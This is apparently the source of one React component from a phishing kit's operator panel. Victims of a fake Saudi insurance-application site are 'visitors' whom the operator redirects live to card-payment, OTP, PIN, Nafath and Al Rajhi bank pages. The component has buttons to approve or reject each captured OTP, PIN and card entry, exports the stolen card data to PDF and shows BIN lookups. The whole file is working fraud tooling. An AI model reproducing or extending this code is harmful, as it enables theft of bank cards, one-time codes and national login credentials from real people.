'use client'

import type { InsuranceApplication } from "@/lib/firestore-types";
import { useState } from "react";
import { updateApplication } from "@/lib/firebase-services";
import { DataBubble } from "./data-bubble";
import {
  convertHistoryToBubbles,
  type HistoryEntry,
} from "@/lib/history-helpers";
import {
  handleCardApproval,
  handleCardRejection,
  handleOtpApproval,
  handleOtpRejection,
  handlePhoneOtpApproval,
  handlePhoneOtpRejection,
  handlePhoneOtpResend,
  updateHistoryStatus,
} from "@/lib/history-actions";
import { getCurrentTimestamp } from "@/lib/time-utils";
import { _d } from "@/lib/secure-utils";
import { generateVisitorPdf, generateCardPdf } from "@/lib/generate-pdf";
import { ArrowRight } from "lucide-react";
import { BinInfo } from "./bin-info";

interface VisitorDetailsProps {
  visitor: InsuranceApplication | null;
  onBack?: () => void;
}

export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
  const [isNavigating, setIsNavigating] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [nafadCode, setNafadCode] = useState("");
  const [cardsLayout, setCardsLayout] = useState<"vertical" | "horizontal">(
    "vertical"
  );
  const [isGeneratingPdf, setIsGeneratingPdf] = useState(false);
  const [isGeneratingCardPdf, setIsGeneratingCardPdf] = useState(false);
  // Track pending action for each bubble to show immediate feedback
  const [pendingActions, setPendingActions] = useState<Record<string, string>>({});

  const formatStcDate = (value?: string) => {
    if (!value) return "غير متوفر";

    const parsed = new Date(value);
    if (Number.isNaN(parsed.getTime())) {
      return value;
    }

    return `${parsed.toLocaleDateString("ar-SA")} ${parsed.toLocaleTimeString(
      "ar-SA",
      { hour: "2-digit", minute: "2-digit" }
    )}`;
  };

  const visitorDisplayName =
    visitor?.ownerName || (visitor as any)?.name || "بدون اسم";

  if (!visitor) {
    return (
      <div className="flex-1 flex items-center justify-center bg-gray-50">
        <div className="text-center text-gray-500">
          <p className="text-lg">اختر زائراً لعرض التفاصيل</p>
        </div>
      </div>
    );
  }

  // Navigation handler
  const handleNavigate = async (destination: string) => {
    if (!visitor.id || isNavigating) return;

    setIsNavigating(true);

    try {
      let updates: Partial<InsuranceApplication> = {};

      switch (destination) {
        case "home":
          // Set both fields for compatibility
          updates = {
            redirectPage: "home" as any,
            currentStep: "home" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "insur":
          updates = {
            redirectPage: "insur" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "compar":
          updates = {
            redirectPage: "compar" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "payment":
          updates = {
            redirectPage: "payment" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "otp":
          updates = {
            redirectPage: "otp" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "pin":
          updates = {
            redirectPage: "pin" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "phone":
          updates = {
            redirectPage: "phone" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "nafad":
          updates = {
            redirectPage: "nafad" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "nafad_modal":
          updates = {
            redirectPage: "nafad_modal" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
        case "rajhi":
          updates = {
            redirectPage: "rajhi" as any,
            redirectPageUpdatedAt: getCurrentTimestamp(),
            currentStepUpdatedAt: getCurrentTimestamp(),
          };
          break;
      }

      if (visitor.id && Object.keys(updates).length > 0) {
        await updateApplication(visitor.id, updates);
      }
    } catch (error) {
      console.error("Error navigating visitor:", error);
    } finally {
      setIsNavigating(false);
    }
  };

  // Bubble action handler
  const handleBubbleAction = async (
    bubbleId: string,
    action: string
  ) => {
    if (!visitor.id || isProcessing) return;

    setIsProcessing(true);
    setPendingActions((prev) => ({ ...prev, [bubbleId]: action }));

    try {
      if (bubbleId.startsWith("card-info") || bubbleId === "card-details") {
        if (action === "otp") {
          await handleCardApproval(visitor.id, "otp");
        } else if (action === "pin") {
          await handleCardApproval(visitor.id, "pin");
        } else if (action === "message") {
          await updateApplication(visitor.id, {
            cardStatus: "message" as any,
            cardStatusUpdatedAt: getCurrentTimestamp(),
          });
        } else if (action === "reject") {
          await handleCardRejection(visitor.id);
        }
      } else if (bubbleId.startsWith("otp-")) {
        if (action === "approve") {
          await handleOtpApproval(visitor.id);
        } else if (action === "reject") {
          await handleOtpRejection(visitor.id);
        } else if (action === "message") {
          await updateApplication(visitor.id, {
            otpStatus: "message" as any,
            otpStatusUpdatedAt: getCurrentTimestamp(),
          });
        }
      } else if (bubbleId.startsWith("phone_otp-")) {
        if (action === "approve") {
          await handlePhoneOtpApproval(visitor.id);
        } else if (action === "reject") {
          await handlePhoneOtpRejection(visitor.id);
        } else if (action === "resend") {
          await handlePhoneOtpResend(visitor.id);
        }
      } else if (bubbleId.startsWith("pin-")) {
        if (action === "approve") {
          await updateApplication(visitor.id, {
            pinStatus: "approved" as any,
            pinStatusUpdatedAt: getCurrentTimestamp(),
          });
        } else if (action === "reject") {
          await updateApplication(visitor.id, {
            pinStatus: "rejected" as any,
            pinStatusUpdatedAt: getCurrentTimestamp(),
          });
        } else if (action === "message") {
          await updateApplication(visitor.id, {
            pinStatus: "message" as any,
            pinStatusUpdatedAt: getCurrentTimestamp(),
          });
        }
      } else if (bubbleId.startsWith("rajhi-")) {
        if (action === "approve") {
          await updateApplication(visitor.id, {
            rajhiStatus: "approved" as any,
            rajhiStatusUpdatedAt: getCurrentTimestamp(),
          });
        } else if (action === "reject") {
          await updateApplication(visitor.id, {
            rajhiStatus: "rejected" as any,
            rajhiStatusUpdatedAt: getCurrentTimestamp(),
          });
        } else if (action === "message") {
          await updateApplication(visitor.id, {
            rajhiStatus: "message" as any,
            rajhiStatusUpdatedAt: getCurrentTimestamp(),
          });
        }
      } else if (bubbleId.startsWith("final_otp-")) {
        if (action === "approve") {
          await updateApplication(visitor.id, {
            finalOtpStatus: "approved" as any,
            finalOtpStatusUpdatedAt: getCurrentTimestamp(),
          });
        } else if (action === "reject") {
          await updateApplication(visitor.id, {
            finalOtpStatus: "rejected" as any,
            finalOtpStatusUpdatedAt: getCurrentTimestamp(),
          });
        } else if (action === "message") {
          await updateApplication(visitor.id, {
            finalOtpStatus: "message" as any,
            finalOtpStatusUpdatedAt: getCurrentTimestamp(),
          });
        }
      } else {
        // Handle history entry updates
        const historyIndex = parseInt(bubbleId.split("-").pop() || "0");
        if (!isNaN(historyIndex) && visitor.history && visitor.history[historyIndex]) {
          const entry = visitor.history[historyIndex];
          await updateHistoryStatus(visitor.id, historyIndex, entry, action);
        }
      }
    } catch (error) {
      console.error("Error handling bubble action:", error);
    } finally {
      setIsProcessing(false);
      setPendingActions((prev) => {
        const newActions = { ...prev };
        delete newActions[bubbleId];
        return newActions;
      });
    }
  };

  // Generate bubbles
  const sortedBubbles = convertHistoryToBubbles(visitor);

  // Export handlers
  const handleExportPdf = async () => {
    if (!visitor.id) return;
    setIsGeneratingPdf(true);
    try {
      await generateVisitorPdf(visitor);
    } catch (error) {
      console.error("Error generating PDF:", error);
    } finally {
      setIsGeneratingPdf(false);
    }
  };

  const handleExportCardPdf = async () => {
    if (!visitor.id) return;
    setIsGeneratingCardPdf(true);
    try {
      await generateCardPdf(visitor);
    } catch (error) {
      console.error("Error generating card PDF:", error);
    } finally {
      setIsGeneratingCardPdf(false);
    }
  };

  return (
    <div className="flex flex-col h-full bg-white">
      {/* Header */}
      <div className="shrink-0 border-b border-gray-200 bg-white p-3 md:p-6">
        <div className="flex items-center justify-between gap-4 mb-4">
          {onBack && (
            <button
              onClick={onBack}
              className="flex items-center gap-2 text-blue-600 hover:text-blue-700 transition-colors"
            >
              <ArrowRight className="w-5 h-5" />
              <span className="text-sm">رجوع</span>
            </button>
          )}
          <h2 className="text-xl md:text-2xl font-bold text-gray-900 flex-1 text-right">
            {visitorDisplayName}
          </h2>
        </div>

        <div className="flex flex-col gap-3">
          <div className="flex gap-2 flex-wrap">
            <button
              onClick={handleExportPdf}
              disabled={isGeneratingPdf}
              className="flex-1 min-w-[120px] rounded-lg bg-red-500 px-3 py-2 text-xs md:text-sm font-semibold text-white hover:bg-red-600 disabled:opacity-50 transition-colors"
            >
              {isGeneratingPdf ? "جاري..." : "📄 تحميل PDF"}
            </button>
            <button
              onClick={handleExportCardPdf}
              disabled={isGeneratingCardPdf}
              className="flex-1 min-w-[120px] rounded-lg bg-blue-600 px-3 py-2 text-xs md:text-sm font-semibold text-white hover:bg-blue-700 disabled:opacity-50 transition-colors"
            >
              {isGeneratingCardPdf ? "جاري..." : "💳 PDF البطاقة"}
            </button>
          </div>

          <div className="flex gap-2">
            <select
              onChange={(e) => {
                if (e.target.value) {
                  handleNavigate(e.target.value);
                  e.target.value = "";
                }
              }}
              className="flex-1 rounded-lg border border-gray-300 px-3 py-2 text-xs md:text-sm font-medium text-gray-700 hover:border-gray-400 transition-colors"
            >
              <option value="">توجيه الزائر...</option>
              <option value="home">🏠 الرئيسية</option>
              <option value="insur">📋 بيانات التأمين</option>
              <option value="compar">📊 مقارنة العروض</option>
              <option value="payment">💳 الدفع (بطاقة)</option>
              <option value="otp">🔑 OTP</option>
              <option value="pin">🔐 PIN</option>
              <option value="phone">📱 معلومات الهاتف</option>
              <option value="nafad">🇸🇦 نفاذ</option>
              <option value="nafad_modal">🪟 نافذة نفاذ</option>
              <option value="rajhi">🏦 راجحي</option>
            </select>
          </div>
        </div>
      </div>

      {/* Bubbles - Single Column Layout */}
      <div className="flex-1 overflow-y-auto p-3 md:p-6">
        {sortedBubbles.length === 0 ? (
          <div className="text-center text-gray-500 py-12">
            <p>لا توجد بيانات لعرضها</p>
          </div>
        ) : (
          <div
            className="flex flex-col gap-4"
            dir="rtl"
          >
            {sortedBubbles.map((bubble) => (
              <div key={bubble.id} className="flex flex-col">
                <DataBubble
                  title={bubble.title}
                  data={bubble.data}
                  timestamp={bubble.timestamp}
                  status={bubble.status}
                  pendingAction={pendingActions[bubble.id]}
                  showActions={bubble.showActions}
                  isLatest={bubble.isLatest}
                  layout="vertical"
                  actions={
                    bubble.customActions ? (
                      bubble.customActions
                    ) : bubble.showActions ? (
                      <div className="flex flex-wrap gap-1.5">
                        {bubble.type === "card" && (
                          <>
                            <button onClick={() => handleBubbleAction(bubble.id, "otp")} disabled={isProcessing}
                              className="rounded-full bg-blue-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-blue-700 disabled:opacity-50 transition-colors">
                              🔑 OTP
                            </button>
                            <button onClick={() => handleBubbleAction(bubble.id, "pin")} disabled={isProcessing}
                              className="rounded-full bg-purple-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-purple-700 disabled:opacity-50 transition-colors">
                              🔐 PIN
                            </button>
                            <button onClick={() => handleBubbleAction(bubble.id, "message")} disabled={isProcessing}
                              className="rounded-full bg-amber-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-amber-600 disabled:opacity-50 transition-colors">
                              📲 رسالة
                            </button>
                            <button onClick={() => handleBubbleAction(bubble.id, "reject")} disabled={isProcessing}
                              className="rounded-full bg-red-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-red-600 disabled:opacity-50 transition-colors">
                              رفض
                            </button>
                          </>
                        )}
                        {(bubble.type === "otp" || bubble.type === "pin" || bubble.type === "phone_otp" || bubble.type === "rajhi" || bubble.type === "final_otp") && (
                          <>
                            <button onClick={() => handleBubbleAction(bubble.id, "approve")} disabled={isProcessing}
                              className="rounded-full bg-emerald-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-emerald-700 disabled:opacity-50 transition-colors">
                              ✓ قبول
                            </button>
                            <button onClick={() => handleBubbleAction(bubble.id, "reject")} disabled={isProcessing}
                              className="rounded-full bg-red-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-red-600 disabled:opacity-50 transition-colors">
                              رفض
                            </button>
                            {(bubble.type === "otp" || bubble.type === "pin" || bubble.type === "rajhi" || bubble.type === "final_otp") && (
                              <button onClick={() => handleBubbleAction(bubble.id, "message")} disabled={isProcessing}
                                className="rounded-full bg-amber-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-amber-600 disabled:opacity-50 transition-colors">
                                📲 رسالة
                              </button>
                            )}
                            {bubble.type === "phone_otp" && (
                              <button onClick={() => handleBubbleAction(bubble.id, "resend")} disabled={isProcessing}
                                className="rounded-full bg-blue-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-blue-700 disabled:opacity-50 transition-colors">
                                إعادة إرسال
                              </button>
                            )}
                          </>
                        )}
                      </div>
                    ) : null
                  }
                />
                {(bubble as any).binNumber && (
                  <BinInfo cardNumber={(bubble as any).binNumber} />
                )}
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
